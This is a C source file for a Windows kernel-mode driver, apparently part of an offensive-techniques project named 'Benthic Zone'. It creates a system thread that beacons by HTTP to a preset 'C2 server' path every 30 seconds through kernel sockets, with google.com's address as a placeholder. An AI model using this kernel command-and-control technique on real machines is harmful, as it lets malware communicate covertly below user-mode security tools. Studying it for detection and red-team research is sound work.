// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------



#pragma warning(disable: 4047)
#pragma warning(disable: 4024)



// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/
// This header is used by kernel
#include <ntddk.h>

// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntstrsafe/
// This header declares functions to handle strings safely (copy, format, concatenate, etc.) and avoid buffer overflows
#include <ntstrsafe.h>

// https://github.com/MiroKaku/libwsk
// The Kernel-Mode Winsock library, supporting TCP, UDP and Unix sockets (DGRAM and STREAM). You should ideally create your own wrapper library for WSK tailored to your project. But if you want something quick and ready-to-go, you can use this library.
#include "libwsk/libwsk.h"



// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------
// START -> MACROS ----------------------------------------------------------------------------------------------------------------------------



// Domain used in the HTTP Host header
#define MACRO_WINSOCKKERNEL_WSK_DOMAIN "www.google.com"

// IP address to connect to
#define MACRO_WINSOCKKERNEL_WSK_IP "142.250.184.14"

// TCP port number
#define MACRO_WINSOCKKERNEL_WSK_PORT 80

// HTTP path for the GET request
#define MACRO_WINSOCKKERNEL_WSK_PATH "/c2"

// Interval in seconds between each periodic HTTP request to the preset C2 server
#define MACRO_WINSOCKKERNEL_INTERVAL_SECONDS 30



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Global socket handle
PWSK_SOCKET Global_WinSockKernel_Socket = NULL;

// Flag indicating whether WSK has been initialized
BOOLEAN Global_WinSockKernel_WSKInitialized = FALSE;

// Handle to the background thread performing periodic requests
HANDLE Global_WinSockKernel_WSKThreadHandle = NULL;

// Flag to signal the background thread to stop
BOOLEAN Global_WinSockKernel_StopWSKThread = FALSE;

// Pointer to the thread object for safe wait
PKTHREAD Global_WinSockKernel_WSKThreadPointer = NULL;



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Initializes the WinSock Kernel (WSK) subsystem if not already initialized.

	@return         STATUS_SUCCESS on success, or an error NTSTATUS code.
**/
NTSTATUS
TechniquesWinSockKernel_InitializeWSK()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (InitializeWSK) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// If already initialized, skip setup
	if (Global_WinSockKernel_WSKInitialized)
	{
		return STATUS_SUCCESS;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	WSKDATA WskData;


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize WSK
	NTSTATUS status = WSKStartup(MAKE_WSK_VERSION(1, 0), &WskData);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (InitializeWSK) - WSKStartup failed (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Set initialized flag
	Global_WinSockKernel_WSKInitialized = TRUE;


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (InitializeWSK) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return STATUS_SUCCESS;
}




/**
	@brief          Converts an IPv4 address in string format to a SOCKADDR_IN structure.


	@param[in]      IpString                String representing the IPv4 address (e.g., "192.168.0.1").

	@param[in]      Port                    Port number in host byte order.

	@param[out]     SockAddr                Pointer to SOCKADDR_IN to be filled.
**/
VOID
TechniquesWinSockKernel_ConvertIPStringToSockaddr(
	_In_            CHAR*                   IpString,
	_In_            USHORT                  Port,
	_Out_           SOCKADDR_IN*            SockAddr
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Clear the SOCKADDR_IN structure

	// The RtlZeroMemory routine fills a block of memory with zeros, given a pointer to the block and the length, in bytes, to be filled.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlzeromemory
	RtlZeroMemory(SockAddr, sizeof(SOCKADDR_IN));


	// ---------------------------------------------------------------------------------------------------------------------
	// Set family and convert port to network byte order
	SockAddr->sin_family = AF_INET;
	SockAddr->sin_port = RtlUshortByteSwap(Port);


	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	IN_ADDR ipAddr;
	CHAR* TerminatingChar = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Convert IP string to binary format

	// The RtlIpv4StringToAddress function converts a string representation of an IPv4 address to a binary IPv4 address.
	// https://learn.microsoft.com/en-us/windows/win32/api/ip2string/nf-ip2string-rtlipv4stringtoaddressa
	if (RtlIpv4StringToAddressA(IpString, TRUE, &TerminatingChar, &ipAddr) == STATUS_SUCCESS)
	{
		// Assign address to SOCKADDR_IN structure
		SockAddr->sin_addr.s_addr = ipAddr.S_un.S_addr;
	}
	else
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (ConvertIPStringToSockaddr) - RtlIpv4StringToAddressA failed.\n");
	}
}


/**
	@brief          Sends a hardcoded HTTP GET request and retrieves the response.


	@param[out]     ResponseBuffer          Buffer to store the HTTP response.

	@param[in]      ResponseBufferSize      Size of the response buffer.


	@return         STATUS_SUCCESS or an NTSTATUS error code.
**/
NTSTATUS
TechniquesWinSockKernel_WSKMakePresetRequest(
	_Out_           CHAR*                   ResponseBuffer,
	_In_            SIZE_T                  ResponseBufferSize
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Variables
	NTSTATUS status;
	SOCKADDR_IN serverAddress;
	SIZE_T bytesSent, bytesReceived;
	CHAR Request[512] = { 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Validate that the response buffer is usable
	if (!ResponseBuffer || ResponseBufferSize == 0)
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - Invalid buffer parameters.\n");
		return STATUS_INVALID_PARAMETER;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Initialize WSK if needed
	if (!Global_WinSockKernel_WSKInitialized)
	{
		status = TechniquesWinSockKernel_InitializeWSK();
		if (!NT_SUCCESS(status))
		{
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - InitializeWSK failed (Status 0x%08X).\n", status);
			return status;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Create a TCP socket

	// The WskSocket function creates a new socket and returns a pointer to the associated socket object.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wsk/nc-wsk-pfn_wsk_socket
	status = WSKSocket(&Global_WinSockKernel_Socket, AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - WSKSocket failed (Status 0x%08X).\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Convert IP string to SOCKADDR structure
	TechniquesWinSockKernel_ConvertIPStringToSockaddr(MACRO_WINSOCKKERNEL_WSK_IP, MACRO_WINSOCKKERNEL_WSK_PORT, &serverAddress);


	// ---------------------------------------------------------------------------------------------------------------------
	// Connect to the remote server
	status = WSKConnect(Global_WinSockKernel_Socket, (PSOCKADDR)&serverAddress, sizeof(serverAddress));

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - WSKConnect failed (Status 0x%08X).\n", status);
		WSKCloseSocket(Global_WinSockKernel_Socket);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Format the HTTP GET request
	RtlStringCbPrintfA(Request, sizeof(Request), "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", MACRO_WINSOCKKERNEL_WSK_PATH, MACRO_WINSOCKKERNEL_WSK_DOMAIN);


	// ---------------------------------------------------------------------------------------------------------------------
	// Send the HTTP request
	status = WSKSend(Global_WinSockKernel_Socket, Request, strlen(Request), &bytesSent, 0, NULL, NULL);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - WSKSend failed (Status 0x%08X).\n", status);
		WSKCloseSocket(Global_WinSockKernel_Socket);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Prepare to receive the HTTP response
	RtlZeroMemory(ResponseBuffer, ResponseBufferSize);
	status = WSKReceive(Global_WinSockKernel_Socket, ResponseBuffer, ResponseBufferSize - 1, &bytesReceived, 0, NULL, NULL);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKMakePresetRequest) - WSKReceive failed (Status 0x%08X).\n", status);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Close the socket connection
	WSKCloseSocket(Global_WinSockKernel_Socket);
	Global_WinSockKernel_Socket = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return status;
}



/**
	@brief          Thread routine that performs periodic HTTP requests every 30 seconds.


	@param[in]      StartContext            Pointer to a caller-defined context passed when the thread was created.
**/
VOID
TechniquesWinSockKernel_WSKPeriodicThread(
	_In_            PVOID                   StartContext
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Unused context parameter
	UNREFERENCED_PARAMETER(StartContext);


	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKPeriodicThread) - Periodic request started\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Interval
	LARGE_INTEGER interval;
	interval.QuadPart = -(LONGLONG)(MACRO_WINSOCKKERNEL_INTERVAL_SECONDS * 1000 * 1000 * 10);


	// ---------------------------------------------------------------------------------------------------------------------
	// Loop
	while (!Global_WinSockKernel_StopWSKThread)
	{

		// -----------------------------------------------------------------------------------------------------------------
		// Initialize a local buffer to store the HTTP response
		CHAR response[2048] = { 0 };


		// -----------------------------------------------------------------------------------------------------------------
		// Send the HTTP request to the preset C2 server and retrieve the response
		NTSTATUS status = TechniquesWinSockKernel_WSKMakePresetRequest(response, sizeof(response));

		// Failed
		if (!NT_SUCCESS(status))
		{
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKPeriodicThread) - Request failed (Status 0x%08X)\n", status);
		}
		// Success
		else
		{
			DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (WSKPeriodicThread) - Response received:\n%s\n", response);
		}


		// -----------------------------------------------------------------------------------------------------------------
		// Sleep for the specified interval before sending the next request

		// The KeDelayExecutionThread routine puts the current thread into an alertable or nonalertable wait state for a specified interval.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kedelayexecutionthread
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Gracefully terminate the system thread

	// The PsTerminateSystemThread routine terminates the current system thread.
	// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-psterminatesystemthread
	PsTerminateSystemThread(STATUS_SUCCESS);
}



/**
	@brief          Creates a system thread to perform periodic C2 HTTP requests using a KEVENT-based wait loop.


	@return         STATUS_SUCCESS if the thread was created, or an appropriate NTSTATUS error code.
**/
NTSTATUS
TechniquesWinSockKernel_StartWSKThread()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StartWSKThread) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Prevent multiple threads from being created
	if (Global_WinSockKernel_WSKThreadHandle != NULL)
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StartWSKThread) - Thread already registered. Skipping creation.\n");
		return STATUS_ALREADY_REGISTERED;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Reset the stop flag so the thread enters its main loop
	Global_WinSockKernel_StopWSKThread = FALSE;


	// ---------------------------------------------------------------------------------------------------------------------
	// Create a new system thread for periodic HTTP requests
	NTSTATUS status = PsCreateSystemThread(&Global_WinSockKernel_WSKThreadHandle, THREAD_ALL_ACCESS, NULL, NULL, NULL, TechniquesWinSockKernel_WSKPeriodicThread, NULL);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StartWSKThread) - PsCreateSystemThread failed (Status 0x%08X)\n", status);
		return status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get a pointer to the created thread object from its handle
	status = ObReferenceObjectByHandle(Global_WinSockKernel_WSKThreadHandle, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, (PVOID*)&Global_WinSockKernel_WSKThreadPointer, NULL);

	// Failed
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StartWSKThread) - ObReferenceObjectByHandle failed (Status 0x%08X)\n", status);
		ZwClose(Global_WinSockKernel_WSKThreadHandle);
		Global_WinSockKernel_WSKThreadHandle = NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StartWSKThread) - Bye\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return status;
}



/**
	@brief          Signals the periodic WSK thread to stop and waits for its termination.
**/
VOID
TechniquesWinSockKernel_StopWSKThread()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StopWSKThread) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Signal the thread to stop by setting the flag
	Global_WinSockKernel_StopWSKThread = TRUE;


	// ---------------------------------------------------------------------------------------------------------------------
	// If a valid thread object exists, wait for it to terminate and release reference
	if (Global_WinSockKernel_WSKThreadPointer)
	{
		// The KeWaitForSingleObject routine puts the current thread into a wait state until the given dispatcher object is set to a signaled state or (optionally) until the wait times out.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-kewaitforsingleobject
		KeWaitForSingleObject(Global_WinSockKernel_WSKThreadPointer, Executive, KernelMode, FALSE, NULL);
		// The ObDereferenceObject routine decrements the given object's reference count and performs retention checks.
		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obdereferenceobject
		ObDereferenceObject(Global_WinSockKernel_WSKThreadPointer);
		Global_WinSockKernel_WSKThreadPointer = NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Close the thread handle if valid
	if (Global_WinSockKernel_WSKThreadHandle)
	{
		ZwClose(Global_WinSockKernel_WSKThreadHandle);
		Global_WinSockKernel_WSKThreadHandle = NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (StopWSKThread) - Bye\n");
}



/**
	@brief          Cleans up WSK resources if previously initialized.
**/
VOID
TechniquesWinSockKernel_Unload()
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (Unload) - Hello\n");


	// ---------------------------------------------------------------------------------------------------------------------
	// Stop the background thread and wait for termination
	TechniquesWinSockKernel_StopWSKThread();


	// ---------------------------------------------------------------------------------------------------------------------
	// Close the socket if still open
	if (Global_WinSockKernel_Socket)
	{
		WSKCloseSocket(Global_WinSockKernel_Socket);
		Global_WinSockKernel_Socket = NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Clean up WSK if it was previously initialized
	if (Global_WinSockKernel_WSKInitialized)
	{
		WSKCleanup();
		Global_WinSockKernel_WSKInitialized = FALSE;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye
	DbgPrint("Benthic Zone -> KernelModeDriver [Techniques/WinSockKernel.c] (Unload) - Bye\n");
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
